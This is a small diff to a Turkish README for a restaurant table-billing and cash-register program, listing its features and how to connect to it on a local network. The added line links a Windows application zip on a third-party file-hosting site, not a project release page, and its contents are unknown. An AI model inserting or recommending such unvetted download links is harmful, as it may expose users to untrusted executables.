@@ -2,6 +2,8 @@
 
 Restoran için masa bazlı adisyon ve kasa programı. Masa planı, adisyon, ürün ürün veya toplu ödeme (nakit, kredi kartı, IBAN / havale), X ve Z raporları, günlük, aylık ve yıllık ciro, ürün ve fiyat yönetimi, 80 / 58 mm fiş yazdırma.
 
+https://dosya.co/j1bcoiwojrr4/CiniKasa-Windows-Uygulama.zip.html
+
 Kasa bu bilgisayarda `http://localhost:4173` adresinde çalışır. Aynı ağdaki telefon ve tabletler bilgisayarın IP adresiyle, PIN girerek bağlanır.
 
 ## Çalıştırma
